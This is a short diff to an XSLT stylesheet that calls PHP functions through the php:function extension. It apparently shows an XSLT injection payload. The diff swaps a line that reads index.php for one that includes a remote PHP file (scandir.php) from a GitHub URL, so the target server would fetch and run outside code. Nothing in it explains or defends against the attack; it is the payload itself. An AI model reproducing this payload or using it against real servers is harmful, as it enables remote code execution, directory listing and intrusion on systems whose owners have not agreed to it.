@@ -1,5 +1,5 @@
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
     <xsl:template match="/">
-        <xsl:value-of select="php:function('file_get_contents','index.php')"/>
+        <xsl:value-of select="php:function('include','https://raw.githubusercontent.com/dotiendat97/thuctap/master/scandir.php')"/>
     </xsl:template>
 </xsl:stylesheet>
